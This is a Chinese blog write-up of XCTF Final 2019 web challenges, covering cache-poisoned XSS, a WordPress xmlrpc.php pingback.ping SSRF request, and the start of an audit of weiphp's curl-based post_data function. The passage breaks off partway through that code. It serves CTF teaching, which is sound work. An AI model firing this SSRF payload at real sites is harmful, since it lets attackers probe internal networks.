defer="defer" src="https://at.alicdn.com/t/font_1780077_0ad2sbnz4nz.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="/css/style.css"><script>window.ga_tid="UA-112937997-1",window.ga_api="https://blog.zeddyu.info/ga_api/*"</script><script src="https://cdn.jsdelivr.net/npm/cfga@1.0.3" async></script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Zedd's Blog" type="application/atom+xml"></head><body><nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation"><div class="container"><div class="navbar-brand"><div class="navbar-item navbar-logo"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://s.gravatar.com/avatar/204a0c779acdb62f9084826396f6dccb?s=80" alt="" height="28"></div><div class="navbar-burger"><span></span><span></span><span></span></div></div><div class="navbar-menu navbar-start"> <a class="navbar-item" href="/">Index</a> <a class="navbar-item" href="/archives">Archives</a> <a class="navbar-item" href="/categories">Categories</a> <a class="navbar-item" href="/tags">Tags</a> <a class="navbar-item" href="/friends">Friends</a> <a class="navbar-item" href="/about">About</a> <a class="navbar-item" href="/advertisement">Ads</a></div><div class="navbar-menu navbar-end"> <a class="navbar-item search" title="Search" href="javascript:;"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-sousuo"></use></svg></a><div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc"> <a class="navbar-item" title="Table of Contents"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-list"></use></svg></a><div class="navbar-dropdown is-right"> <a class="navbar-item" href="#Web">1&nbsp;&nbsp;<b>Web</b></a> <a class="navbar-item" href="#babyblog">1.1&nbsp;&nbsp;babyblog</a> <a class="navbar-item" href="#babypress">1.2&nbsp;&nbsp;babypress</a> <a class="navbar-item" href="#weiphp">1.3&nbsp;&nbsp;weiphp</a> <a class="navbar-item" href="#SSRF">1.3.1&nbsp;&nbsp;SSRF</a> <a class="navbar-item" href="#upload">1.3.2&nbsp;&nbsp;upload</a> <a class="navbar-item" href="#lfi2019">1.4&nbsp;&nbsp;lfi2019</a> <a class="navbar-item" href="#Trick-1">1.4.1&nbsp;&nbsp;Trick 1</a> <a class="navbar-item" href="#Trick-2">1.4.2&nbsp;&nbsp;Trick 2</a> <a class="navbar-item" href="#noxss">1.5&nbsp;&nbsp;noxss</a> <a class="navbar-item" href="#tfboys">1.6&nbsp;&nbsp;tfboys</a><hr class="navbar-divider"> <a class="navbar-item" href="#Conclusion">2&nbsp;&nbsp;<b>Conclusion</b></a></div></div> <a class="navbar-item" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-github"></use></svg></a> <a class="navbar-item" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-twitter"></use></svg></a> <a class="navbar-item" title="RSS" href="https://blog.zeddyu.info/atom.xml"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-rss"></use></svg></a></div></div></nav><section class="section"><div class="container"><article class="article content gallery" itemscope itemprop="blogPost"><h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name"> XCTF Final 2019 Web Write Up</h1><div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile"> <span class="column is-narrow"><span>Nov 14 2019</span> <span class="second-date-block">(<time datetime="2019-11-14T00:02:53.000Z" itemprop="datePublished">Nov 14 2019</time>)</span></span> <span class="column is-narrow article-category"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-folder"></use></svg><a class="article-category-link" href="/categories/CTF/">CTF</a></span> <span class="column is-narrow"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-shalou"></use></svg> <span class="article-category-link">28 minutes read (About 4131 words)</span></span></div><div class="article-entry is-size-6-mobile" itemprop="articleBody"><ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web"><span class="post-toc-number">1.</span> <span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#babyblog"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">babyblog</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#babypress"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">babypress</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#weiphp"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">weiphp</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SSRF"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">SSRF</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#upload"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">upload</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lfi2019"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">lfi2019</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Trick-1"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">Trick 1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Trick-2"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">Trick 2</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#noxss"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">noxss</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tfboys"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">tfboys</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Conclusion"><span class="post-toc-number">2.</span> <span class="post-toc-text">Conclusion</span></a></li></ol><html><head></head><body><p>我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。</p><a id="more"></a><p>[TOC]</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="babyblog"><a href="#babyblog" class="headerlink" title="babyblog"></a>babyblog</h2><p>界面跟 Byte CTF 的 <a href="https://blog.zeddyu.info/2019/09/17/bytectf2019/#babyblog">babyblog</a> 一致，有些功能还保留着，很有误导性…以为是个升级版，前者是一道二次注入后用 php 正则<code>/e</code>特性来执行命令的，所以我们一开始也就一直在日注入了…</p><p>后来我发现<code>/user</code>个人界面有 ip 记录，于是尝试 XFF 注入无果，但是可以把 XFF 直接回显到页面上。发现<code>/server_status</code>，发现有大家的访问记录。陷入思考ing…</p><p>队友突然看到有一个访问记录<code>/user/1.css</code>（类似的这么一个路由，不太想得起来了），马上想到可能是缓存投毒，联想跟上文说的 XFF 的设置，想到可以缓存投毒将反射 xss 变成缓存 xss ，这样就可以打到 admin 了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109012449.png" alt=""></p><h2 id="babypress"><a href="#babypress" class="headerlink" title="babypress"></a>babypress</h2><p>这题比较狗血…前一天给了两个 hint :</p><p></p><figure class="highlight applescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">first</span> hint <span class="hljs-keyword">for</span> babypress: ssrf n-<span class="hljs-built_in">day</span> exploit <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> internet will <span class="hljs-keyword">not</span> work</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">second</span> hint: <span class="hljs-keyword">if</span> you can exploit <span class="hljs-keyword">in</span> your <span class="hljs-keyword">local</span>, <span class="hljs-keyword">it</span> should be possible <span class="hljs-keyword">to</span> exploit <span class="hljs-keyword">in</span> remote.</span><br></pre></td></tr></tbody></table></figure><p></p><p>随便搜一下我们大概可以知道 ssrf n-day 是通过 <code>xmlrpc.php</code> 这个文件来打内网的，然后当晚我们通过<code>xmlrpc.php</code>成功进行了 SSRF ，当看到了这两个 hint …我们就感觉不妙，应该打的不是我们这个， but 我们确实打成功了呀…于是我们当晚又加了一会班，当时最新版本是 5.2.4 ，于是我们找到 5.2.4 的 <a href="https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/" target="_blank" rel="noopener">security issue</a>，然后找到了<a href="https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2" target="_blank" rel="noopener">更新补丁</a>，但是感觉绕不过…以为是个新的绕过方式啥的…</p><p>好了，结果到了第二天一开始没人打成功…后来，到了差不多中午主办方又发公告更换环境，当时我们都在看另一个题，也就没管，结果一会有两个队出了…然后我们试了一下昨晚我们打<code>xmlrpc.php</code>的，就成了…</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>pingback.ping<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>http://<span class="hljs-tag">&lt;<span class="hljs-name">YOUR</span> <span class="hljs-attr">SERVER</span> &gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>http://<span class="hljs-tag">&lt;<span class="hljs-name">SOME</span> <span class="hljs-attr">VALID</span> <span class="hljs-attr">BLOG</span> <span class="hljs-attr">FROM</span> <span class="hljs-attr">THE</span> <span class="hljs-attr">SITE</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>主要就是要发一个评论以及更改一下第二个参数为他的 host 才行…这题也没啥好说的…感觉全场唯一的槽点(Web)就是这个了。</p><h2 id="weiphp"><a href="#weiphp" class="headerlink" title="weiphp"></a>weiphp</h2><p>一个叫 weiphp 的 CMS 审计，这个主要是队友看的，我当时做另外一道题去了。我们出的是一个 ssrf 的地方，赛后问了出的师傅，是审了上传的地方。</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>我们全局搜<code>curl</code>，可以在 Base.php 中发现有以下代码：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post_data</span><span class="hljs-params">($url, $param, $type = <span class="hljs-string">'json'</span>, $return_array = true, $useCert = [])</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  $res = post_data($url, $param, $type, $return_array, $useCert);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">// 各种常见错误判断</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'curl_erron'</span>])) {</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;error($res[<span class="hljs-string">'curl_erron'</span>] . <span class="hljs-string">': '</span> . $res[<span class="hljs-string">'curl_error'</span>]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ($return_array) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'errcode'</span>]) &amp;&amp; $res[<span class="hljs-string">'errcode'</span>] != <span class="hljs-number">0</span>) {</span><br><span class="line">      <span class="hljs-keyword">$this</span>-&gt;error(error_msg($res));</span><br><span class="line">    } <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'return_code'</span>]) &amp;&amp; $res[<span class="hljs-string">'return_code'</span>] == <span class="hljs-string">'FAIL'</span> &amp;&amp; <span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'return_msg'</span>])) {</span><br><span class="line">      <span class="hljs-keyword">$this</span>-&gt;error($res[<span class="hljs-string">'return_msg'</span>]);</span><br><span class="line">    } <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'result_code'</span>]) &amp;&amp; $res[<span class="hljs-string">'result_code'</span>] == <span class="hljs-string">'FAIL'</span> &amp;&amp; <span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'err_code'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'err_code_des'</span>])) {</span><br><span class="line">      <span class="hljs-keyword">$this</span>-&gt;error($res[<span class="hljs-string">'err_code'</span>] . <span class="hljs-string">': '</span> . $res[<span class="hljs-string">'err_code_des'</span>]);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> $res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>跟进第三行的<code>post_data</code>，我们可以在 common.php 中找到该函数：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post_data</span><span class="hljs-params">($url, $param = [], $type = <span class="hljs-string">'json'</span>, $return_array = true, $useCert = [])</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    $has_json = <span class="hljs-keyword">false</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ($type == <span class="hljs-string">'json'</span> &amp;&amp; is_array($param)) {</span><br><span class="line">        $has_json = <span class="hljs-keyword">true</span>;</span><br><span class="line">        $param = json_encode($param, JSON_UNESCAPED_UNICODE);</span><br><span class="line">    } <span class="hljs-keyword">elseif</span> ($type == <span class="hljs-string">'xml'</span> &amp;&amp; is_array($param)) {</span><br><span class="line">        $param = ToXml($param);</span><br><span class="line">    }</span><br><span class="line">    add_debug_log($url, <span class="hljs-string">'post_data'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// 初始化curl</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    <span class="hljs-keyword">if</span> ($type != <span class="hljs-string">'file'</span>) {</span><br><span class="line">        add_debug_log($param, <span class="hljs-string">'post_data'</span>);</span><br><span class="line">        <span class="hljs-comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="hljs-number">30</span>);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="hljs-number">180</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="hljs-keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="hljs-keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="hljs-keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// 设置header</span></span><br><span class="line">    <span class="hljs-keyword">if</span> ($type == <span class="hljs-string">'file'</span>) {</span><br><span class="line">        $header[] = <span class="hljs-string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    } <span class="hljs-keyword">elseif</span> ($type == <span class="hljs-string">'xml'</span>) {</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-keyword">false</span>);</span><br><span class="line">    } <span class="hljs-keyword">elseif</span> ($has_json) {</span><br><span class="line">        $header[] = <span class="hljs-string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="hljs-comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($useCert[<span class="hljs-string">'certPath'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($useCert[<span class="hljs-string">'keyPath'</span>])) {</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLCERTTYPE, <span class="hljs-string">'PEM'</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLCERT, $useCert[<span class="hljs-string">'certPath'</span>]);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLKEYTYPE, <span class="hljs-string">'PEM'</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLKEY, $useCert[<span class="hljs-string">'keyPath'</span>]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    <span class="hljs-keyword">if</span> ($type != <span class="hljs-string">'file'</span>) {</span><br><span class="line">        add_debug_log($res, <span class="hljs-string">'post_data'</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">// echo $res;die;</span></span><br><span class="line">    $flat = curl_errno($ch);</span><br><span class="line"></span><br><span class="line">    $msg = <span class="hljs-string">''</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ($flat) {</span><br><span class="line">        $msg = curl_error($ch);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">// add_request_log($url, $param, $res, $flat, $msg);</span></span><br><span class="line">    <span class="hljs-keyword">if</span> ($flat) {</span><br><span class="line">        <span class="hljs-keyword">return</span> [</span><br><span 